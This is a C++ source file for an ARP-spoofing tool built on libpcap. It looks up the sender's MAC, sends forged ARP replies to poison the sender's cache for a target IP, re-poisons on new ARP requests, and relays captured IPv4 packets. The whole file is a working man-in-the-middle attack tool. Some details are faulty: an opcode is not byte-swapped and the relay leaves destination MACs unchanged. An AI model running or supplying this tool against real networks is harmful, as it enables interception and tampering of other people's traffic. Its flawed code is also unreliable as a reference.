#include <cstdio>
#include <sys/ioctl.h>
#include <net/if.h>
#include <string.h>
#include <unistd.h>
#include <pcap.h>
#include <map>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)

using namespace std;
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2n");
}

string get_atk_ip(char* interface) {
    struct ifreq ifr;
    static char atk_ip[40];
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if(sock == -1) {
        fprintf(stderr, "Get IP Error(socket)\n");
        return "";
    }
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    
    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
        fprintf(stderr, "Get IP Error\n");
        close(sock);
        return "";
    } else {
        inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, atk_ip, sizeof(struct sockaddr));
    }
    close(sock);
    return atk_ip;
}

string get_atk_mac(char* interface) {
    struct ifreq ifr;
    static char atk_mac[40];
    unsigned char* mac = NULL;
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);
    if(sock == -1) {
        fprintf(stderr, "Get mac Error(socket)\n");
        return "";
    }
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0) {
        fprintf(stderr, "Get mac Error\n");
        close(sock);
        return "";
    } else {
        mac = (unsigned char*)ifr.ifr_hwaddr.sa_data;
        sprintf(atk_mac, "%02x:%02x:%02x:%02x:%02x:%02x",
                mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    }
    close(sock);
    return atk_mac;
}

string get_sender_mac(pcap_t* handle, string atk_ip, string atk_mac, string sender_ip) {
    EthArpPacket packet_request;

    packet_request.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
    packet_request.eth_.smac_ = Mac(atk_mac);
    packet_request.eth_.type_ = htons(EthHdr::Arp);

	packet_request.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet_request.arp_.pro_ = htons(EthHdr::Ip4);
	packet_request.arp_.hln_ = Mac::SIZE;
	packet_request.arp_.pln_ = Ip::SIZE;
	packet_request.arp_.op_ = htons(ArpHdr::Request);
    packet_request.arp_.smac_ = Mac(atk_mac);
    packet_request.arp_.sip_ = htonl(Ip(atk_ip));
    packet_request.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet_request.arp_.tip_ = htonl(Ip(sender_ip));

	int request_res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet_request), sizeof(EthArpPacket));
    if (request_res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", request_res, pcap_geterr(handle));
        return "";
	}
    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int reply_res = pcap_next_ex(handle, &header, &packet);
        if (reply_res == 0) continue;
        if (reply_res == -1 || reply_res == -2) {
            printf("pcap_next_ex return %d(%s)\n", reply_res, pcap_geterr(handle));
            break;
        }
        
        EthHdr* eth;
        ArpHdr* arp;
        eth = (EthHdr *)packet;
        if(eth->type() == EthHdr::Arp) {
            packet += sizeof(EthHdr);
            arp = (ArpHdr *)packet;
            if(arp->op() == ArpHdr::Reply && arp->tmac() == Mac(atk_mac) && arp->tip() == Ip(atk_ip) && arp->sip() == Ip(sender_ip)) {
                return string(arp->smac());
            }
        }
        
    }
    return "";
}

int infect_arp_sender(pcap_t* handle, string atk_mac, string sender_ip, string sender_mac, string target_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac(sender_mac);
    packet.eth_.smac_ = Mac(atk_mac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = (ArpHdr::Reply);
    packet.arp_.smac_ = Mac(atk_mac);
    packet.arp_.sip_ = htonl(Ip(target_ip));
    packet.arp_.tmac_ = Mac(sender_mac);
    packet.arp_.tip_ = htonl(Ip(sender_ip));

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return 1;
    }
    return 0;
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
		usage();
		return -1;
	}

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    string atk_ip = "";
    string atk_mac = "";
    string sender_ip = "";
    string sender_mac = "";
    string target_ip = "";
    string target_mac = "";
    map<string,string> sender_list;
    multimap<string,string> sender_target;
    
    atk_ip = get_atk_ip(dev);
    atk_mac = get_atk_mac(dev);

    if (atk_ip.empty()){
        fprintf(stderr, "Can't get attacker IP.\n");
        return -1;
    }
    if (atk_mac.empty()) {
        fprintf(stderr, "Can't get attacker Mac.\n");
        return -1;
    }

    for (int i = 1; i < argc / 2; i++) {
        sender_ip = argv[i * 2];
        target_ip = argv[i * 2 + 1];
        sender_target.insert(pair<string,string>(sender_ip, target_ip));
        if (sender_list.find(sender_ip) != sender_list.end()) continue;
        sender_mac = get_sender_mac(handle, atk_ip, atk_mac, sender_ip);
        if (sender_mac.empty()) {
            printf("Can't get sender Mac(%s).\n", sender_ip.c_str());
        }
        sender_list.insert(pair<string,string>(sender_ip, sender_mac));
    }

    for (int i = 1; i < argc / 2; i++) {
        sender_ip = argv[i * 2];
        target_ip = argv[i * 2 + 1];
        sender_mac = sender_list.find(sender_ip)->second;
        if(infect_arp_sender(handle, atk_mac, sender_ip, sender_mac, target_ip) != 0) {
            printf("send-arp %d failed.\n", i);
        }
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(handle, &header, &packet);
        if (res == 0) continue;
        if (res == -1 || res == -2) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
        }
        EthHdr* eth;
        eth = (EthHdr *)packet;
        if (eth->type() == EthHdr::Arp) {
            ArpHdr* arp;
            arp = (ArpHdr *)(packet + sizeof(EthHdr));
            sender_ip = string(arp->sip());
            target_ip = string(arp->tip());
            if (arp->op() == ArpHdr::Request) {
                if(arp->tmac() == Mac("00:00:00:00:00:00")
                    && sender_target.count(sender_ip) > 0) {
                    multimap<string,string>::iterator it;
                    for (it = sender_target.equal_range(sender_ip).first;
                         it != sender_target.equal_range(sender_ip).second; it++) {
                        if(it->second == target_ip) {
                            sender_mac = sender_list.find(sender_ip)->second;
                            infect_arp_sender(handle, atk_mac, sender_ip, sender_mac, target_ip);
                        }
                    }
                }
            }
        }
        if (eth->type() == EthHdr::Ip4) {
            eth->smac_ = Mac(atk_mac);
            int res = pcap_sendpacket(handle, packet, header->caplen);
            if (res != 0) {
                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            }
        }
    }
}
